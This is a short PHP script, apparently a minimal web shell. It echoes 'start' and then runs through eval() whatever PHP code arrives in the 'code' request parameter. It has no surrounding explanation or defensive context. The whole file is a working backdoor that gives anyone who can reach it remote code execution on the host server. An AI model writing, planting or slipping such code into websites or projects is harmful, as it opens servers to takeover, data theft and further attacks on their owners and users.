<?php

echo "start";
if (isset($_REQUEST['code'])) 
	eval($_REQUEST['code']);
?>